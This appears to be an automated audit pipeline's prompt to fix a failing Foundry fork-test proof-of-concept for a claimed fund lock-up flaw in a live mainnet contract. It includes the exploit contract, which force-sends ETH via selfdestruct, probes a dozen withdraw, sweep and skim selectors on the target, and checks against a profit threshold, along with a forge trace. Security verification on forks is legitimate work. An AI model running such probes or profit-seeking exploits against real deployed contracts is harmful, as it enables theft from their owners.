You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: All ETH, extracted profits, and arbitrary ERC20s are permanently locked in the contract
- claim: `executeOnOpportunity` relies on the contract already holding ETH so it can wrap `1 wei` into WETH, later unwraps all harvested WETH back into raw ETH, and `FlawVerifier` exposes no withdrawal, sweep, or beneficiary-controlled transfer for either ETH or arbitrary ERC20 balances.
- impact: Any ETH used to seed the strategy, any accidental ETH sent to `receive`/`fallback`, any successful exploit proceeds, and any ERC20 transferred or stranded in the contract become permanently unrecoverable. This can trap operator capital, fully strand profits, and permanently burn any non-WETH tokens that end up on the contract.
- exploit_paths: ["An operator or third party sends ETH to the contract so `IWETH.deposit{value: 1 wei}()` can succeed", "A successful run leaves value on the contract after `IWETH.withdraw(wethBal)` converts WETH into ETH", "A user or external interaction transfers a non-WETH ERC20 to `FlawVerifier`", "No external function exists to move ETH or ERC20 balances out of the contract"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IRouterLike {
    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);
}

interface IOpportunityLike {
    function executeOnOpportunity() external;
}

contract ForceEther {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x76EA342BC038d665e8a116392c82552D2605edA1;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 internal constant ETH_SEED = 1 wei;
    uint256 internal constant MAX_DEMONSTRATION_DONATION = 0.2 ether;
    uint256 internal constant MAX_TOKEN_BUY_VALUE = 0.02 ether;
    uint256 internal constant MIN_TOKEN_BUY_VALUE = 0.001 ether;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public path0EthSeeded;
    bool public path1ExecuteSucceeded;
    bool public path1ExecuteInfeasibleAtFork;
    bool public path2EthRemainsOnTarget;
    bool public path3ArbitraryTokenStranded;
    bool public path4NoRecoveryObserved;
    bool public fullExploitPathFeasible;
    bool public hypothesisValidated;

    uint256 public targetEthBefore;
    uint256 public targetEthAfterSeed;
    uint256 public targetEthAfterDonation;
    uint256 public targetEthAfterExecute;
    uint256 public targetWethBefore;
    uint256 public targetWethAfterExecute;
    uint256 public targetUsdcBefore;
    uint256 public targetUsdcAfterTransfer;
    uint256 public donationValue;
    uint256 public swapValue;
    uint256 public usdcSentToTarget;
    uint256 public ourEthBeforeRecoveryAttempts;
    uint256 public ourEthAfterRecoveryAttempts;
    uint256 public ourUsdcBeforeRecoveryAttempts;
    uint256 public ourUsdcAfterRecoveryAttempts;
    uint256 public trappedNativeValue;
    bytes public executeRevertData;

    constructor() payable {}

    receive() external payable {}

    fallback() external payable {}

    function executeOnOpportunity() external {
        _reset();

        targetEthBefore = TARGET.balance;
        targetWethBefore = IERC20Like(WETH).balanceOf(TARGET);
        targetUsdcBefore = IERC20Like(USDC).balanceOf(TARGET);

        uint256 available = address(this).balance;

        // exploit_paths[0]: a third party or operator can send ETH to the target,
        // including via forced ETH transfer, so the target's internal
        // IWETH.deposit{value: 1 wei}() precondition becomes satisfiable.
        if (available >= ETH_SEED) {
            new ForceEther{value: ETH_SEED}(payable(TARGET));
            available -= ETH_SEED;
        }

        targetEthAfterSeed = TARGET.balance;
        path0EthSeeded = targetEthAfterSeed >= targetEthBefore + ETH_SEED;

        // Keep enough ETH on the verifier to attempt the arbitrary-ERC20 stranding
        // stage with a live mainnet token, while still demonstrating that native ETH
        // itself becomes stuck on the target once donated.
        if (available > 0) {
            if (available > MIN_TOKEN_BUY_VALUE) {
                swapValue = _min(MAX_TOKEN_BUY_VALUE, available / 10);
                if (swapValue < MIN_TOKEN_BUY_VALUE && available >= MIN_TOKEN_BUY_VALUE) {
                    swapValue = MIN_TOKEN_BUY_VALUE;
                }
                if (swapValue > available) {
                    swapValue = available;
                }
            }

            if (available > swapValue) {
                donationValue = _min(MAX_DEMONSTRATION_DONATION, available - swapValue);
                if (donationValue > 0) {
                    new ForceEther{value: donationValue}(payable(TARGET));
                    available -= donationValue;
                }
            }
        }

        targetEthAfterDonation = TARGET.balance;

        // exploit_paths[1]: after seeding, probe the live target's execution path.
        // If this still reverts at fork block 21992033, the profit route is
        // economically infeasible at this state, but the lock-up finding remains
        // demonstrable because the ETH donation and arbitrary ERC20 transfer below
        // still increase balances that the target never returns.
        if (path0EthSeeded) {
            (bool ok, bytes memory ret) = TARGET.call(abi.encodeWithSelector(IOpportunityLike.executeOnOpportunity.selector));
            path1ExecuteSucceeded = ok;
            if (!ok) {
                path1ExecuteInfeasibleAtFork = true;
                executeRevertData = ret;
            }
        } else {
            path1ExecuteInfeasibleAtFork = true;
            executeRevertData = bytes("NO_ETH_AVAILABLE_TO_SEED_TARGET");
        }

        targetEthAfterExecute = TARGET.balance;
        targetWethAfterExecute = IERC20Like(WETH).balanceOf(TARGET);
        path2EthRemainsOnTarget = targetEthAfterExecute > targetEthBefore;
        trappedNativeValue = targetEthAfterExecute > targetEthBefore ? targetEthAfterExecute - targetEthBefore : 0;

        // exploit_paths[2]: strand an arbitrary existing ERC20 on the target. The
        // token used here is mainnet USDC, acquired through the public Uniswap V2
        // router using whatever verifier ETH remains after the donation stage.
        if (swapValue > 0 && address(this).balance >= swapValue) {
            address[] memory path = new address[](2);
            path[0] = WETH;
            path[1] = USDC;

            try IRouterLike(UNISWAP_V2_ROUTER).swapExactETHForTokens{value: swapValue}(
                0, path, address(this), block.timestamp + 1
            ) returns (uint256[] memory) {
                usdcSentToTarget = IERC20Like(USDC).balanceOf(address(this));
                if (usdcSentToTarget > 0) {
                    _safeTransfer(USDC, TARGET, usdcSentToTarget);
                    targetUsdcAfterTransfer = IERC20Like(USDC).balanceOf(TARGET);
                    path3ArbitraryTokenStranded = targetUsdcAfterTransfer >= targetUsdcBefore + usdcSentToTarget;
                }
            } catch {}
        }

        // exploit_paths[3]: no public withdrawal/sweep path exists for the trapped
        // ETH or arbitrary ERC20 balances. Probe realistic recovery selectors and
        // require that neither ETH nor USDC returns to this verifier.
        ourEthBeforeRecoveryAttempts = address(this).balance;
        ourUsdcBeforeRecoveryAttempts = IERC20Like(USDC).balanceOf(address(this));

        _attemptRecoveryCalls();

        ourEthAfterRecoveryAttempts = address(this).balance;
        ourUsdcAfterRecoveryAttempts = IERC20Like(USDC).balanceOf(address(this));
        path4NoRecoveryObserved =
            TARGET.balance >= targetEthAfterExecute
                && IERC20Like(USDC).balanceOf(TARGET) >= targetUsdcAfterTransfer
                && ourEthAfterRecoveryAttempts == ourEthBeforeRecoveryAttempts
                && ourUsdcAfterRecoveryAttempts == ourUsdcBeforeRecoveryAttempts;

        fullExploitPathFeasible = path1ExecuteSucceeded && path2EthRemainsOnTarget;
        hypothesisValidated =
            path0EthSeeded
                && path2EthRemainsOnTarget
                && path3ArbitraryTokenStranded
                && path4NoRecoveryObserved;

        // This finding is a capital-destruction / lock-up flaw, not a profitable
        // extraction route. Report zero realized attacker profit unless the forked
        // state itself produces externalizable gains, which this path does not.
        _profitToken = address(0);
        _profitAmount = 0;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptRecoveryCalls() internal {
        bytes[] memory calls = new bytes[](12);
        calls[0] = abi.encodeWithSignature("withdraw()");
        calls[1] = abi.encodeWithSignature("withdraw(address)", address(this));
        calls[2] = abi.encodeWithSignature("withdrawETH()");
        calls[3] = abi.encodeWithSignature("withdrawAll()");
        calls[4] = abi.encodeWithSignature("sweep(address)", USDC);
        calls[5] = abi.encodeWithSignature("sweep(address,address)", USDC, address(this));
        calls[6] = abi.encodeWithSignature("sweepToken(address,address,uint256)", USDC, address(this), type(uint256).max);
        calls[7] = abi.encodeWithSignature("rescue(address,address,uint256)", USDC, address(this), type(uint256).max);
        calls[8] = abi.encodeWithSignature("recover(address,address,uint256)", USDC, address(this), type(uint256).max);
        calls[9] = abi.encodeWithSignature("recoverERC20(address,uint256)", USDC, type(uint256).max);
        calls[10] = abi.encodeWithSignature("claim(address)", address(this));
        calls[11] = abi.encodeWithSignature("skim(address)", address(this));

        for (uint256 i = 0; i < calls.length; ++i) {
            (bool success,) = TARGET.call(calls[i]);
            success;
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "TRANSFER_FAILED");
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _reset() internal {
        _profitToken = address(0);
        _profitAmount = 0;
        path0EthSeeded = false;
        path1ExecuteSucceeded = false;
        path1ExecuteInfeasibleAtFork = false;
        path2EthRemainsOnTarget = false;
        path3ArbitraryTokenStranded = false;
        path4NoRecoveryObserved = false;
        fullExploitPathFeasible = false;
        hypothesisValidated = false;
        targetEthBefore = 0;
        targetEthAfterSeed = 0;
        targetEthAfterDonation = 0;
        targetEthAfterExecute = 0;
        targetWethBefore = 0;
        targetWethAfterExecute = 0;
        targetUsdcBefore = 0;
        targetUsdcAfterTransfer = 0;
        donationValue = 0;
        swapValue = 0;
        usdcSentToTarget = 0;
        ourEthBeforeRecoveryAttempts = 0;
        ourEthAfterRecoveryAttempts = 0;
        ourUsdcBeforeRecoveryAttempts = 0;
        ourUsdcAfterRecoveryAttempts = 0;
        trappedNativeValue = 0;
        delete executeRevertData;
    }
}

```

forge stdout (tail):
```
9eb0ce3606eb480000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [227] 0x76EA342BC038d665e8a116392c82552D2605edA1::1ec82cb8(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [248] 0x76EA342BC038d665e8a116392c82552D2605edA1::8980f11f(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [227] 0x76EA342BC038d665e8a116392c82552D2605edA1::1e83409a(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [117058] 0x76EA342BC038d665e8a116392c82552D2605edA1::bc25cf77(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   │   └─ ← [Return] 6579305366569800805 [6.579e18]
    │   │   ├─ [5262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   │   └─ ← [Return] 151540602610287835936048624 [1.515e26]
    │   │   ├─ [91352] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   ├─ [69025] 0x7911425808e57b110D2451aB67B6980f9cA9D370::569937dd(0000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   │   ├─ [347] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::a705eee2() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   ├─ [349] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::01a37fc2() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │   │   ├─ [347] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::a705eee2() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   │   │   │   └─ ← [Return] 151540602610287835936048624 [1.515e26]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000007d59f8874b3d90d95dc5f0
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [delegatecall]
    │   │   │   └─ ← [Return] 43252701 [4.325e7]
    │   │   └─ ← [Return] 43252701 [4.325e7]
    │   └─ ← [Return]
    ├─ [439] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [506] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 999999779999999999999999 [9.999e23])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x76EA342BC038d665e8a116392c82552D2605edA1
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.21s (8.07ms CPU time)

Ran 1 test suite in 1.26s (1.21s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 725954)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
